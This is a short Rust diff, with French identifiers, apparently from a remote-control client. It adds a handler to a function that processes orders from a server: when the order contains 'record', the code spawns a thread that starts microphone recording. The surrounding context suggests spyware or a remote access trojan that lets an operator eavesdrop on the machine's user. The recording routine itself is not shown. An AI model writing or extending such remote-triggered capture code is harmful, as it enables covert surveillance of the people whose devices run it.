@@ -26,6 +26,14 @@ pub(crate) fn ordre_du_srv(mut ordre: String) {
             });
         }
 
+        if shared_ordre.lock().unwrap().contains("record") {
+            println!("Lancement de l'enregistrement du microphone");
+            let ordre_clone = Arc::clone(&shared_ordre);
+            let t = thread::spawn(move || {
+                record::record();
+            });
+        }
+
         println!("{:?}", shared_ordre.lock().unwrap().as_str());
     }
 
